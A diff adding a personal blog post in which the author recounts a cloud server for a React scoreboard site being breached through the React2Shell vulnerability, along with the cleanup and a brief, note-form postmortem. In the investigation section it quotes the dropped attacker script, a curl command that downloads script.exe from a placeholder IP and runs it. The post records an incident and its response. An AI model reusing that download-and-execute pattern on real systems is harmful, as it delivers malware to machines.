@@ -1,0 +1,39 @@
+---
+title: 'I got hacked by China'
+description: 'oh no! anyway...'
+pubDate: 'Dec 11 2025'
+heroImage: '../../assets/find-an-image.jpg'
+---
+
+Early last week, [Vercel announced a new vulnerability](https://vercel.com/kb/bulletin/react2shell) discovered in Next.js and React Router enabling remote code execution on effected versions. 
+
+### I was running those versions.
+
+While this site runs Astro on Next.js, each of my scoreboard sites had been running a vulnerable version of React. I updated the scores.npoet.dev domain via ```npm audit fix``` and didn't run into any issues. However, when updating on hoops.npoet.dev I used the script recommended in the initial post from Vercel, and must not have fully updated or refreshed the server. 
+
+Cloudflare and others had quickly deployed their own mitigation strategies in an effort to block the influx of attacks [but this caused its own set of problems](https://blog.cloudflare.com/5-december-2025-outage/) early on December 5th. 
+
+## Investigating
+
+It was the Cloudflare outage that led me to re-check my AWS instances, as the hoops.npoet.dev site was now showing an error page. 
+
+Upon login, I first noticed that I was no longer running the default user in zsh shell. Waiting within the working directory for my React/Next.js project was a malicious script, "s", which was (nearly verbatim) as follows:
+```````
+curl bad.ip.addr > script.exe
+do script.exe
+bye
+```````
+
+##### Highly advanced stuff! *Probably should've checked out script.exe*
+
+I was not interested in creating a new VM to check on this IP, nor did I think I'd find anything more interesting than a crypto miner there anyway. Luckily for me, my firewall rules on AWS prevented this script from accessing the internet, and I don't run windows to begin with.
+
+Before attempting any further discovery on the active server, I decided to kill it and create a new instance on a fresh Elastic IP. Better safe than sorry.
+
+## Postmortem
+
+continued DNS probes
+
+no evidence of API abuse
+
+no unauthorized access, no SSH nor additional React2Shell evidence. 
